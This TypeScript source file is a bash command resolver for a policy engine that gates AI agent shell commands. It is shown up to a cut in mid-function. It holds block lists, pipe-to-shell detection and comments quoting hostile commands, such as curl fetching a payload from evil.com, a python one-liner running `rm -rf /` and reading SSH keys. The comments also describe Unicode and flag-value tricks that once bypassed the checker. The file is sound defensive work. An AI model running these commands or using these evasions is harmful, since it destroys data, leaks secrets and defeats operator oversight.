// bash resolver. Walks the tree-sitter-bash AST against a closed
// whitelist of node types per `TREE_SITTER_SHELL.md §9`. Anything
// inside the whitelist is decomposed into per-command capabilities;
// anything outside is `Refuse` with a specific reason. The whitelist
// IS the policy surface — adding a new shape means a PR against
// `TREE_SITTER_SHELL.md` plus conformance cases, not a silent code
// change.
//
// Design contracts:
//
//   1. Tree-sitter is the entry-point, not the authority. We trust
//      the AST shape for tokenization (quoting, line continuation,
//      heredoc bodies, $(...) detection) — but not for capability
//      resolution. Resolver maps `command_name` → COMMAND_TABLE;
//      unknown command names already trigger Refuse via the
//      `unknown_command` branch.
//
//   2. Reject early, reject loud. Every Refuse reason carries the
//      offending node type or command name so the operator + audit
//      forensics can pinpoint why a shape was rejected.
//
//   3. The whitelist is small. SIMPLE_COMMAND, SIMPLE_PIPELINE,
//      SIMPLE_SEQUENCE, plus literal redirects. Per `§9.1`.
//      Adversarial constructs (command_substitution, expansion,
//      function_definition, process_substitution, heredoc with
//      expansion in body, variable assignment prefix, ANSI-C
//      strings) are all Refuse — `§3.5` lists why each is red.
//
//   4. Protected paths from slice 1 close on the bash side.
//      classifyProtectedPath runs against every `word`-shaped arg
//      AND every file redirect target. Deny-tier → Refuse;
//      escalate-tier drops confidence to low so the engine forces
//      a confirm via slice-3 wiring.

import { resolve as resolvePath } from 'node:path';
import type { Node } from 'web-tree-sitter';
import { parseBash } from '../bash-parser.ts';
import type { Capability } from '../capabilities.ts';
import { deleteFs, exec, gitWrite, netEgress, readFs, writeFs } from '../capabilities.ts';
import { classifyProtectedPath } from '../protected_paths.ts';
import {
  type Resolver,
  type ResolverContext,
  type ResolverResult,
  registerResolver,
} from './registry.ts';

const isNonEmptyString = (v: unknown): v is string => typeof v === 'string' && v.length > 0;

// Always lexically normalizes via `path.resolve(cwd, ...)` even when
// `path` is already absolute, so `..`/`./` components don't survive
// into the resulting capability scope. See slice 29 / fs.ts:resolveAbs
// for the security rationale.
//
// Tilde expansion (slice 97, R2 P0 finding): bash command-args
// receive the same `~` → `home` mapping the fs resolver applies.
// Without it, `cat ~/.ssh/id_rsa` resolves to a literal `~/.ssh/`
// under cwd in the capability scope, but the SHELL then expands
// `~` to the real HOME on execution — the gap between resolver
// view and runtime view is a §11 bypass. Both shapes the shell
// honors are expanded here:
//   - bare `'~'` → `ctx.home`
//   - `'~/<rest>'` → `<ctx.home>/<rest>`
// `'~user/...'` (other-user expansion) stays literal — the engine
// can't safely resolve another user's home without an OS call,
// and an LLM emitting `~root/...` is far more often an attack
// than a legitimate operator-aliased reference.
const expandTilde = (path: string, home: string): string => {
  if (path === '~') return home;
  if (path.startsWith('~/')) return `${home}/${path.slice(2)}`;
  return path;
};

const resolveArg = (path: string, ctx: ResolverContext): string =>
  resolvePath(ctx.cwd, expandTilde(path, ctx.home));

// POSIX-aware positional extraction: tokens before `--` get the
// classic "starts-with-`-` is a flag" treatment; `--` itself is
// consumed; everything after is positional regardless of leading
// dash (per POSIX utility convention, e.g. `rm -- -rf` deletes a
// file literally named `-rf`).
const stripFlags = (tokens: readonly string[]): string[] => {
  const positional: string[] = [];
  let afterSep = false;
  for (const t of tokens) {
    if (afterSep) {
      positional.push(t);
      continue;
    }
    if (t === '--') {
      afterSep = true;
      continue;
    }
    if (!t.startsWith('-')) positional.push(t);
  }
  return positional;
};

// ─── Whitelist + red-flag node types (§9.1, §3.5) ──────────

// Node types that the resolver knows how to walk. Anything outside
// this set hits the `unsupported_shape` Refuse path. The list is
// intentionally small; new types need PR + conformance case +
// `TREE_SITTER_SHELL.md` update.
const WHITELIST_NODE_TYPES: ReadonlySet<string> = new Set([
  'program',
  'list',
  'pipeline',
  'command',
  'command_name',
  'word',
  'string',
  'string_content',
  'raw_string',
  'concatenation',
  'file_redirect',
  'redirected_statement',
  // File descriptor prefixes / dup targets in redirects.
  // `2>&1`, `cmd >&-`, `1>&2` — file_descriptor + the `>&`/`<&`
  // operator with a numeric target are pure fd manipulation; no
  // filesystem side effect.
  'file_descriptor',
  'number',
  // Operator / punctuation tokens. Tree-sitter exposes these as
  // anonymous nodes named after the literal text.
  '|',
  '||',
  '&&',
  ';',
  '&',
  '>',
  '>>',
  '<',
  '>|',
  '&>',
  '&>>',
  '>&',
  '<&',
  '"',
  "'",
]);

// Node types that, when present, indicate adversarial or dynamic
// shapes the resolver can't safely model. Each maps to a stable
// Refuse reason for the audit log + modal preview.
const RED_FLAG_NODES: ReadonlyMap<string, string> = new Map([
  [
    'command_substitution',
    'command_substitution ($(...) / backtick): inner script runs in subshell context',
  ],
  [
    'process_substitution',
    'process_substitution (<(...) / >(...)): side-effect process outside AST',
  ],
  ['expansion', 'parameter_expansion (${var/...}, ${var:-...}): runtime substitution'],
  ['simple_expansion', 'variable_expansion ($var): value not resolvable statically'],
  ['arithmetic_expansion', 'arithmetic_expansion ($((..))): can read/assign variables'],
  ['function_definition', 'function_definition: scope-dynamic; can shadow built-ins'],
  [
    'variable_assignment',
    'variable_assignment prefix (PATH=/tmp cmd): can override binary resolution',
  ],
  ['subscript', 'array_subscript: indexed/associative array access'],
  ['regex', 'regex_match (=~): runtime evaluation'],
  ['ansi_c_string', "ansi_c_string ($'...'): escape semantics not modeled"],
  ['translated_string', 'translated_string ($"..."): locale-dependent'],
  ['heredoc_redirect', 'heredoc_redirect (<<DELIM): body interpretation not modeled'],
  ['herestring_redirect', 'herestring_redirect (<<<): body interpretation not modeled'],
  ['if_statement', 'if_statement: control flow not modeled'],
  ['while_statement', 'while_statement: control flow not modeled'],
  ['for_statement', 'for_statement: control flow not modeled'],
  ['case_statement', 'case_statement: control flow not modeled'],
  ['subshell', 'subshell ((cmd)): nested execution context'],
  ['compound_statement', 'compound_statement ({cmd;}): block context'],
  ['negated_command', 'negated_command (!cmd): control flow not modeled'],
  ['test_command', 'test_command ([[ ]]): conditional context'],
  ['test_operator', 'test_operator: conditional context'],
]);

// Hard refuses by command name. §13 reject list from
// TREE_SITTER_SHELL.md §7 + §13. mkfs.* matches every filesystem
// variant via prefix.
const HARD_REFUSE_COMMANDS: ReadonlySet<string> = new Set([
  'eval',
  'exec',
  'source',
  '.',
  'trap',
  'alias',
  'shopt',
  'set',
  'unset',
  'declare',
  'export',
  'typeset',
  'readonly',
  'local',
  'dd',
  'fdisk',
  'parted',
  'mkswap',
  'shred',
]);

const isHardRefuseCommand = (name: string): boolean => {
  if (HARD_REFUSE_COMMANDS.has(name)) return true;
  if (name.startsWith('mkfs.')) return true;
  return false;
};

// Pipe-to-shell pattern detection. A pipeline whose final stage is a
// shell interpreter (`sh`, `bash`, `zsh`, etc.) reads its stdin as a
// script — fully arbitrary. Refuse.
const SHELL_INTERPRETERS: ReadonlySet<string> = new Set([
  'sh',
  'bash',
  'zsh',
  'dash',
  'ksh',
  'fish',
]);

// ─── COMMAND_TABLE ─────────────────────────────────────────────

// Per-command resolver. Same shape as slice 3 — takes positional
// args + flags + ctx, returns capabilities + confidence OR refuse
// reason. The whitelist walk decomposes the AST into these inputs
// per `command` node.
type CommandResolverResult =
  | { capabilities: Capability[]; confidence: 'high' | 'medium' }
  | { refuse: string };

type CommandResolver = (
  positional: string[],
  allTokens: readonly string[],
  ctx: ResolverContext,
) => CommandResolverResult;

const cmdRead: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: positional.map((p) => readFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// Pure-output writers (echo / printf). They emit their arguments
// verbatim to stdout — a string like "/etc/passwd" passed to echo
// is NOT a filesystem read, it's text. No read-fs capability is
// attributed. Redirects (`echo hi > /etc/foo`) are still inspected
// separately in `analyzeCommand` and trigger the protected-path
// check on the redirect target regardless of source command.
const cmdEcho: CommandResolver = () => ({ capabilities: [], confidence: 'high' });

// grep / rg: first positional is the regex pattern, NOT a path.
// Skip it. Remaining positionals (if any) are file paths the
// command reads from. With no file positionals the command reads
// from stdin — attribute read-fs of cwd as a conservative floor
// for pipeline composition. The `-exec` escape hatch maps to
// arbitrary exec like find's.
const cmdGrep: CommandResolver = (positional, tokens, ctx) => {
  if (tokens.includes('-exec') || tokens.includes('--exec')) {
    return {
      capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
      confidence: 'medium',
    };
  }
  const pathArgs = positional.slice(1);
  if (pathArgs.length === 0) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: pathArgs.map((p) => readFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// find: all positionals are filesystem paths (find DIR1 DIR2 -name ...).
// Pattern-style filters arrive as flags and are excluded by stripFlags.
const cmdFind: CommandResolver = (positional, tokens, ctx) => {
  if (tokens.includes('-exec') || tokens.includes('--exec')) {
    return {
      capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
      confidence: 'medium',
    };
  }
  const paths = positional.length === 0 ? [ctx.cwd] : positional.map((p) => resolveArg(p, ctx));
  return {
    capabilities: paths.map((p) => readFs(p)),
    confidence: 'high',
  };
};

const cmdRm: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { refuse: 'rm: missing target' };
  }
  return {
    capabilities: positional.map((p) => deleteFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

const cmdMvCp: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length < 2) {
    return { refuse: 'mv/cp: needs at least source and destination' };
  }
  const dst = positional[positional.length - 1] as string;
  const srcs = positional.slice(0, -1);
  return {
    capabilities: [...srcs.map((s) => readFs(resolveArg(s, ctx))), writeFs(resolveArg(dst, ctx))],
    confidence: 'high',
  };
};

const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
  if (tokens.some((t) => t === '--proxy' || t === '-x')) {
    return { refuse: 'curl/wget: proxy-shaped flags suggest evasion' };
  }
  // Detect `-o <path>` / `--output <path>` (curl) and `-O` /
  // `--output-document` (wget); also support combined-form
  // `-o<path>` and `--output=<path>` shapes (slice 98, R2 #200).
  // Pre-slice the resolver emitted ONLY `net-egress:<host>` for
  // these shapes, hiding the WRITE side of the call from the
  // capability audit and the §11 protected-path check. An
  // adversarial `curl evil.com/payload -o /etc/agent/policy.toml`
  // would slip past both layers because `/etc/agent/policy.toml`
  // never appeared as a write target. Slice 98 emits the write
  // capability so the engine's protected-path classifier sees the
  // target and §11 fires for the `/etc/*` escalate tier.
  //
  // wget's `-O <file>` is the same shape as curl's `-o`; both
  // resolvers also honor `wget -P <dir>` (prefix directory). For
  // forms we can't decisively map (`-O-` writes to stdout, `-O` with
  // no operand is wget syntactic noise), we don't emit a write
  // capability — the URL-side egress still covers the net side, and
  // the operator's modal will see the literal command.
  const writeTargets: string[] = [];
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    // curl long form `--output=<path>`
    if (t.startsWith('--output=')) {
      const target = t.slice('--output='.length);
      if (target.length > 0) writeTargets.push(target);
      continue;
    }
    // curl short combined form `-o<path>` (no space)
    if (t.length > 2 && t.startsWith('-o') && !t.startsWith('--')) {
      writeTargets.push(t.slice(2));
      continue;
    }
    // wget long form `--output-document=<path>`
    if (t.startsWith('--output-document=')) {
      const target = t.slice('--output-document='.length);
      if (target.length > 0) writeTargets.push(target);
      continue;
    }
    // Separated forms: `-o <path>`, `--output <path>`, `-O <path>`,
    // `--output-document <path>`. Skip the value-less degenerate
    // shape `-O-` (writes to stdout) and `-O` followed by another
    // flag (likely a typo; let the operator's modal catch it).
    if (t === '-o' || t === '--output' || t === '-O' || t === '--output-document') {
      const next = tokens[i + 1];
      if (next !== undefined && next !== '-' && !next.startsWith('-')) {
        writeTargets.push(next);
        i += 1;
      }
    }
  }
  const urlToken = positional[0];
  const writeCaps = writeTargets.map((p) => writeFs(resolveArg(p, ctx)));
  if (urlToken === undefined) {
    return { capabilities: [netEgress('*'), ...writeCaps], confidence: 'medium' };
  }
  try {
    const host = new URL(urlToken).hostname.toLowerCase();
    return {
      capabilities: [netEgress(host || '*'), ...writeCaps],
      confidence: 'high',
    };
  } catch {
    return { capabilities: [netEgress('*'), ...writeCaps], confidence: 'medium' };
  }
};

const cmdGit: CommandResolver = (positional, tokens, ctx) => {
  const sub = positional[0];
  const REPO = ctx.cwd;
  if (sub === undefined) {
    return { capabilities: [readFs(REPO)], confidence: 'high' };
  }
  switch (sub) {
    case 'status':
    case 'log':
    case 'diff':
    case 'show':
    case 'blame':
    case 'rev-parse':
    case 'config':
    case 'remote':
      return { capabilities: [readFs(REPO)], confidence: 'high' };
    case 'commit':
    case 'add':
    case 'merge':
    case 'rebase':
    case 'cherry-pick':
    case 'stash':
    case 'tag':
    case 'reset':
      return { capabilities: [gitWrite(REPO), readFs(REPO)], confidence: 'high' };
    case 'push':
    case 'pull':
    case 'fetch':
      return {
        capabilities: [gitWrite(REPO), netEgress('*'), readFs(REPO)],
        confidence: 'high',
      };
    case 'clean':
      if (tokens.some((t) => /^-f/.test(t))) {
        return { capabilities: [deleteFs(REPO), gitWrite(REPO)], confidence: 'high' };
      }
      return { capabilities: [readFs(REPO)], confidence: 'high' };
    default:
      return {
        capabilities: [gitWrite(REPO), readFs(REPO), netEgress('*')],
        confidence: 'medium',
      };
  }
};

// Node-ecosystem package managers (npm, yarn, pnpm, bun). Hosts and
// target dirs reflect what those tools actually touch — `node_modules`
// under cwd, plus the npm + yarn registries. Pre-slice 100 (R2 #205)
// `cmdPkgInstall` collapsed every package manager to the SAME shape,
// emitting npm hosts for pip and pypi hosts for npm; the audit row
// lied about which network namespace each invocation actually reached.
const cmdNpmLike: CommandResolver = (_positional, _tokens, ctx) => {
  return {
    capabilities: [
      exec('arbitrary'),
      writeFs(resolvePath(ctx.cwd, 'node_modules')),
      readFs(ctx.cwd),
      netEgress('registry.npmjs.org'),
      netEgress('registry.yarnpkg.com'),
    ],
    confidence: 'medium',
  };
};

// Python ecosystem (pip, pip3). pip writes to site-packages (system or
// venv path; we don't try to resolve it deterministically — `arbitrary
// + read-fs:cwd` covers the worst case) and reaches PyPI. Other
// registries (private mirrors, conda) require operator-side allow
// rules that match the explicit `--index-url` flag — out of scope
// for the static resolver.
const cmdPip: CommandResolver = (_positional, _tokens, ctx) => {
  return {
    capabilities: [exec('arbitrary'), readFs(ctx.cwd), netEgress('pypi.org')],
    confidence: 'medium',
  };
};

const cmdChmodChown: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { refuse: 'chmod/chown: missing target' };
  }
  return {
    capabilities: positional.map((p) => writeFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// Language interpreters (python, python3, node, ruby, perl). Slice
// 100 (R2 #208): pre-slice the resolver emitted `exec:arbitrary +
// read-fs:cwd` for ANY invocation regardless of args — including
// the `-c "..."` shape that hands the interpreter an arbitrary code
// string to execute. While `exec:arbitrary` honestly admits "this
// can run anything", it doesn't distinguish a script-file invocation
// (statically analyzable) from inline-code execution. A policy that
// allowed `exec:python` via a narrow bash allow rule for known
// `python script.py` invocations would silently admit `python -c
// "import os; os.system('rm -rf /')"` under the same umbrella.
//
// Defense: refuse when `-c <code>` is present. Operators wanting
// inline interpreter exec must wire it through a separate tool with
// explicit confirm semantics; the bash resolver isn't the right
// place to model arbitrary inline-code execution shapes.
const cmdInterpreter: CommandResolver = (_positional, tokens, ctx) => {
  // `-c` indicates inline code. Both POSIX (`python -c "code"`) and
  // perl-specific variants (`-e`/`-E` for one-liners) collapse here
  // — perl's `-e` is the same threat model. Refuse the lot.
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i];
    if (t === '-c' || t === '-e' || t === '-E') {
      return {
        refuse: `interpreter: '${t} <code>' executes inline code; refusing static analysis`,
      };
    }
  }
  return {
    capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
    confidence: 'high',
  };
};

// No-op commands: builtins / utilities with no filesystem or
// network side effect. They get just the baseline `exec:shell`
// from the aggregator above. Listed explicitly here (instead of
// falling through to "unknown command Refuse") so common operator
// shapes don't pop a modal for every `sleep 30` or `true`.
const cmdNoOp: CommandResolver = () => ({ capabilities: [], confidence: 'high' });

// Read-only system info / identity / lookup utilities. They
// consult system state (env, /etc/passwd, /etc/group, $PATH
// resolution); resolver attributes a coarse read-fs of /etc as
// the worst case. The classifier_protected_paths will still
// catch any caller-supplied paths.
const cmdSysInfo: CommandResolver = () => ({
  capabilities: [readFs('/etc')],
  confidence: 'high',
});

// Filesystem-mutating utilities that create or touch a target.
// mkdir / touch / ln / mktemp: positional args are the targets.
const cmdMkdir: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { capabilities: [writeFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: positional.map((p) => writeFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// `cd` is a builtin; in a tool-call context the cwd change doesn't
// persist between invocations, so there's no observable fs side
// effect. We attribute read-fs of the target dir for completeness.
const cmdCd: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: [readFs(resolveArg(positional[0] as string, ctx))],
    confidence: 'high',
  };
};

const COMMAND_TABLE: ReadonlyMap<string, CommandResolver> = new Map<string, CommandResolver>([
  ['ls', cmdRead],
  ['cat', cmdRead],
  ['head', cmdRead],
  ['tail', cmdRead],
  ['wc', cmdRead],
  ['file', cmdRead],
  ['stat', cmdRead],
  ['pwd', cmdRead],
  ['echo', cmdEcho],
  ['printf', cmdEcho],
  ['grep', cmdGrep],
  ['rg', cmdGrep],
  ['find', cmdFind],
  ['rm', cmdRm],
  ['rmdir', cmdRm],
  ['mv', cmdMvCp],
  ['cp', cmdMvCp],
  ['curl', cmdCurlWget],
  ['wget', cmdCurlWget],
  ['git', cmdGit],
  ['gh', cmdGit],
  ['npm', cmdNpmLike],
  ['yarn', cmdNpmLike],
  ['bun', cmdNpmLike],
  ['pip', cmdPip],
  ['pip3', cmdPip],
  ['pnpm', cmdNpmLike],
  ['chmod', cmdChmodChown],
  ['chown', cmdChmodChown],
  ['python', cmdInterpreter],
  ['python3', cmdInterpreter],
  ['node', cmdInterpreter],
  ['ruby', cmdInterpreter],
  ['perl', cmdInterpreter],
  // Filesystem-mutating builtins / utilities
  ['mkdir', cmdMkdir],
  ['touch', cmdMkdir],
  ['ln', cmdMkdir],
  ['mktemp', cmdMkdir],
  // No-op / shell-level builtins
  ['sleep', cmdNoOp],
  ['true', cmdNoOp],
  ['false', cmdNoOp],
  // System-info / identity / lookup
  ['whoami', cmdSysInfo],
  ['id', cmdSysInfo],
  ['groups', cmdSysInfo],
  ['hostname', cmdSysInfo],
  ['uname', cmdSysInfo],
  ['uptime', cmdSysInfo],
  ['date', cmdSysInfo],
  ['env', cmdSysInfo],
  ['printenv', cmdSysInfo],
  ['which', cmdSysInfo],
  ['type', cmdSysInfo],
  ['command', cmdSysInfo],
  // Navigation (no persistent side-effect across tool calls)
  ['cd', cmdCd],
]);

// ─── AST walk ──────────────────────────────────────────────

interface CommandShape {
  name: string;
  args: string[];
  redirects: RedirectShape[];
}

interface RedirectShape {
  kind: 'out' | 'append' | 'in' | 'both' | 'force-out';
  target: string;
}

// Tree-sitter exposes anonymous nodes whose `type` is the literal
// punctuation text. They show up as children of `command` /
// `pipeline` / `list` and don't carry semantics beyond delimitation
// — anchor for grouping.
const isPunctuationType = (t: string): boolean =>
  t === '|' ||
  t === '||' ||
  t === '&&' ||
  t === ';' ||
  t === '&' ||
  t === '>' ||
  t === '>>' ||
  t === '<' ||
  t === '>|' ||
  t === '&>' ||
  t === '&>>' ||
  t === '"' ||
  t === "'";

// Codepoint ranges that smuggle non-ASCII tokens past byte-equality
// checks (slice 98, R2 #196). The tree-sitter bash grammar tokenizes
// strictly on bytes — fullwidth `；` (U+FF1B) parses as a `word`
// child, NOT as a `;` punctuation node, so a deny pattern matching
// the literal `';'` is silently bypassed; same for zero-width
// joiners hidden inside command names (`gi‍t status` reads as
// `git status` to a human and to most rendering layers but is a
// different byte sequence to the resolver), and bidi overrides
// (U+202E reverses display order, so an adversarial source line
// looks like `cat README` while executing `rm -rf /`).
//
// Defense: refuse any literal carrying these codepoints. The
// resolver's `Refuse` outcome short-circuits the call with a stable
// reason — operators can author rules against the recognized
// shape, and the LLM gets an explicit error rather than a silent
// success on the wrong literal. ASCII-only is the right boundary:
// non-ASCII filenames are legitimate (UTF-8 paths exist), but they
// MUST go through the operator's modal where the literal is
// previewed in full; bypassing rule matching on the resolver side
// would erase that intervention.
const isFullwidthAscii = (cp: number): boolean => cp >= 0xff00 && cp <= 0xffef;
const isZeroWidth = (cp: number): boolean =>
  cp === 0x200b ||
  cp === 0x200c ||
  cp === 0x200d ||
  cp === 0xfeff ||
  cp === 0x2060 ||
  cp === 0x180e;
const isBidiOverride = (cp: number): boolean =>
  (cp >= 0x202a && cp <= 0x202e) || (cp >= 0x2066 && cp <= 0x2069);
const isC1Control = (cp: number): boolean => cp >= 0x0080 && cp <= 0x009f;

const containsUnicodeBypass = (text: string): boolean => {
  for (const ch of text) {
    const cp = ch.codePointAt(0);
    if (cp === undefined) continue;
    if (isFullwidthAscii(cp) || isZeroWidth(cp) || isBidiOverride(cp) || isC1Control(cp)) {
      return true;
    }
  }
  return false;
};

// Extracts the literal text of a `word`, `string`, `raw_string`, or
// `concatenation` node. Returns null when the node carries embedded
// expansion / substitution — those should already have been refused
// by the whitelist walk; this is a defensive secondary check.
//
// Unicode-bypass check (slice 98, R2 #196): every extracted literal
// runs `containsUnicodeBypass`. A match returns null, surfaced by
// the walker as `bash_shape_not_recognized: dynamic content inside
// string arg` — same refuse semantics as embedded substitution.
const literalText = (node: Node): string | null => {
  let raw: string;
  if (node.type === 'word' || node.type === 'raw_string') {
    raw = node.text;
  } else if (node.type === 'string') {
    // string can contain string_content children and optional
    // string_expansion / command_substitution. If any of those red-
    // flag children exist we refuse upstream — here we just join the
    // text content directly.
    for (const child of node.children) {
      if (child !== null && RED_FLAG_NODES.has(child.type)) return null;
    }
    // strip surrounding quotes; tree-sitter includes them as children
    raw = node.text.replace(/^["']|["']$/g, '');
  } else if (node.type === 'concatenation') {
    let acc = '';
    for (const child of node.children) {
      if (child === null) continue;
      const inner = literalText(child);
      if (inner === null) return null;
      acc += inner;
    }
    return acc;
  } else {
    return null;
  }
  if (containsUnicodeBypass(raw)) return null;
  return raw;
};

// Map a `file_redirect` node's operator + target into a RedirectShape.
// Returns null on shapes the resolver can't normalize.
const redirectShape = (node: Node): RedirectShape | null => {
  let kind: RedirectShape['kind'] | null = null;
  let target: string | null = null;
  for (const child of node.children) {
    if (child === null) continue;
    if (child.type === '>') kind = 'out';
    else if (child.type === '>>') kind = 'append';
    else if (child.type === '<') kind = 'in';
    else if (child.type === '&>' || child.type === '&>>') kind = 'both';
    else if (child.type === '>|') kind = 'force-out';
    else if (child.type === 'word' || child.type === 'string' || child.type === 'raw_string') {
      target = literalText(child);
    }
  }
  if (kind === null || target === null) return null;
  return { kind, target };
};

interface WalkResult {
  // Either a list of CommandShape objects (the AST decomposed into
  // per-command tuples) or a Refuse reason. Walk is short-circuited
  // on the first refusal — adversarial constructs anywhere in the
  // script refuse the whole script, since the whole thing executes
  // as one bash invocation.
  commands?: CommandShape[];
  refuse?: string;
}

// Recursion depth ceiling for `walkAst` (slice 98, R2 #198). A
// pathologically nested input — say, 10,000 levels of brace groups
// `{{{ ... }}}` — would otherwise blow the JS stack on `visit`'s
// recursive call into children, taking down the engine before the
// resolver could refuse with a structured envelope. 64 is well
// above legitimate shell shapes (the deepest realistic real-world
// pipeline is ~8 levels) and well below the Node 24 default
// stack budget (which permits ~1500 deep recursion in practice
// but varies by build). Refuse with a stable reason so audit /
// modal can surface the cause cleanly.
const MAX_AST_DEPTH = 64;

// Walk the AST starting at the program root. Validates every node
// against WHITELIST_NODE_TYPES and RED_FLAG_NODES; decomposes
// `command` nodes into shapes.
const walkAst = (root: Node): WalkResult => {
  const commands: CommandShape[] = [];
  const visit = (node: Node, depth: number): string | null => {
    if (depth > MAX_AST_DEPTH) {
      return `bash_shape_not_recognized: ast_depth_exceeded (>${MAX_AST_DEPTH})`;
    }
    // Red-flag check first — beats whitelist if a node is both
    // (e.g. expansion that happens to be enumerated in whitelist).
    const redFlag = RED_FLAG_NODES.get(node.type);
    if (redFlag !== undefined) {
      return `bash_shape_not_recognized: ${redFlag}`;
    }
    // Skip ERROR nodes — tree-sitter recovers from parse errors and
    // emits ERROR placeholders. Anything error-recovered is by
    // definition outside the whitelist.
    if (node.type === 'ERROR' || node.isError) {
      return `bash_shape_not_recognized: parse_error at ${node.startPosition.row}:${node.startPosition.column}`;
    }
    if (isPunctuationType(node.type)) return null;
    if (!WHITELIST_NODE_TYPES.has(node.type)) {
      return `bash_shape_not_recognized: ${node.type}`;
    }
    // Decompose `command` nodes into shapes.
    if (node.type === 'command') {
      const shape: CommandShape = { name: '', args: [], redirects: [] };
      for (const child of node.children) {
        if (child === null) continue;
        if (child.type === 'command_name') {
          // command_name wraps a single `word` (per grammar).
          const inner = child.namedChild(0) ?? child.children[0];
          if (inner === null || inner === undefined) {
            return 'bash_shape_not_recognized: empty command_name';
          }
          const text = literalText(inner);
          if (text === null) {
            return `bash_shape_not_recognized: dynamic command_name (${inner.type})`;
          }
          shape.name = text;
        } else if (
          child.type === 'word' ||
          child.type === 'string' ||
          child.type === 'raw_string' ||
          child.type === 'concatenation'
        ) {
          const text = literalText(child);
          if (text === null) {
            return 'bash_shape_not_recognized: dynamic content inside string arg';
          }
          shape.args.push(text);
        } else if (child.type === 'file_redirect') {
          const r = redirectShape(child);
          if (r === null) {
            return 'bash_shape_not_recognized: redirect target is non-literal';
          }
          shape.redirects.push(r);
        } else if (!isPunctuationType(child.type)) {
          // Recurse into red-flag check / unknown.
          const refuse = visit(child, depth + 1);
          if (refuse !== null) return refuse;
        }
      }
      if (shape.name === '') {
        return 'bash_shape_not_recognized: command without name';
      }
      commands.push(shape);
      return null;
    }
    // For `redirected_statement`, its first child is usually a
    // command and the rest are file_redirects. Treat them inline.
    if (node.type === 'redirected_statement') {
      // Walk children — the command will register itself, and the
      // file_redirects need to be merged into the most recently
      // pushed command.
      const before = commands.length;
      for (const child of node.children) {
        if (child === null) continue;
        const refuse = visit(child, depth + 1);
        if (refuse !== null) return refuse;
      }
      // Merge any file_redirects that appeared as siblings into the
      // last command.
      const lastCmd = commands[commands.length - 1];
      if (lastCmd !== undefined && commands.length > before) {
        for (const child of node.children) {
          if (child !== null && child.type === 'file_redirect') {
            const r = redirectShape(child);
            if (
              r !== null &&
              !lastCmd.redirects.some((x) => x.kind === r.kind && x.target === r.target)
            ) {
              lastCmd.redirects.push(r);
            }
          }
        }
      }
      return null;
    }
    // For `program` / `list` / `pipeline` / `string` / etc. just
    // recurse into children — the walk validates each level.
    for (const child of node.children) {
      if (child === null) continue;
      const refuse = visit(child, depth + 1);
      if (refuse !== null) return refuse;
    }
    return null;
  };

  const refuse = visit(root, 0);
  if (refuse !== null) return { refuse };
  return { commands };
};

// Detect pipe-to-shell on a `pipeline` node. Returns the offending
// stage name when found.
const detectPipeToShell = (root: Node): string | null => {
  const pipelines = root.descendantsOfType('pipeline');
  for (const pipeline of pipelines) {
    const stages = pipeline.children.filter((c) => c !== null && c.type === 'command') as Node[];
    if (stages.length < 2) continue;
    const last = stages[stages.length - 1];
    if (last === undefined) continue;
    const nameNode = last.childForFieldName('name') ?? last.namedChild(0);
    if (nameNode === null || nameNode === undefined) continue;
    const text = literalText(nameNode.children[0] ?? nameNode) ?? nameNode.text;
    if (SHELL_INTERPRETERS.has(text)) return text;
  }
  return null;
};

// ─── Per-command analysis ──────────────────────────────────

const isReadOnlyCommand = (name: string): boolean => {
  switch (name) {
    case 'ls':
    case 'cat':
    case 'head':
    case 'tail':
    case 'wc':
    case 'file':
    case 'stat':
    case 'pwd':
    case 'grep':
    case 'rg':
    case 'find':
      return true;
    default:
      return false;
  }
};

// Pure-output commands: their positional args are literal strings
// emitted to stdout, not paths. The per-arg protected-path loop is
// skipped for these. Redirects are still inspected separately
// because `echo hi > /etc/foo` does write to /etc/foo regardless
// of which command produced the bytes.
const isPureOutputCommand = (name: string): boolean => name === 'echo' || name === 'printf';

const analyzeCommand = (
  shape: CommandShape,
  ctx: ResolverContext,
): { refuse: string } | { caps: Capability[]; confidence: 'high' | 'medium' | 'low' } => {
  if (isHardRefuseCommand(shape.name)) {
    return {
      refuse: `bash: command '${shape.name}' has no safe capability resolution`,
    };
  }

  // Per-arg protected-path check. Closes the slice-1 bash-side gap.
  // Skipped for pure-output commands (echo/printf) whose args are
  // literal output text, not filesystem targets. Redirects on those
  // commands are still checked in the redirect loop below.
  // §11 protected-path check over bash positional args. Slice 100
  // (R2 #206): pre-slice this loop skipped EVERY token starting
  // with `-`, including the `--flag=<value>` shape that carries
  // a real path in the value half. `--config=/etc/agent/policy.toml`
  // looked like a flag to the loop and slipped past the classifier
  // — an LLM tricking a tool into accepting a protected path as
  // a flag value would bypass §11 entirely.
  //
  // Fix: detect `--flag=<value>` and `-f=<value>` shapes, extract
  // the value, classify it. Pure flags (`-r`, `--help`) without
  // an `=` still skip — those carry no path content. Flag-value
  // pairs separated by space (`-o /etc/foo`) are out of scope
  // here because the loop sees them as two consecutive tokens;
  // the per-command resolvers that care about them (cmdCurlWget,
  // slice 98 R2 #200) already consume both and emit explicit
  // capabilities that the engine's downstream §11 walk catches.
  const extractFlagValue = (arg: string): string | null => {
    if (!arg.startsWith('-')) return arg;
    const eq = arg.indexOf('=');
    if (eq === -1) return null;
    const value = arg.slice(eq + 1);
    return value.length > 0 ? value : null;
  };
  let escalated = false;
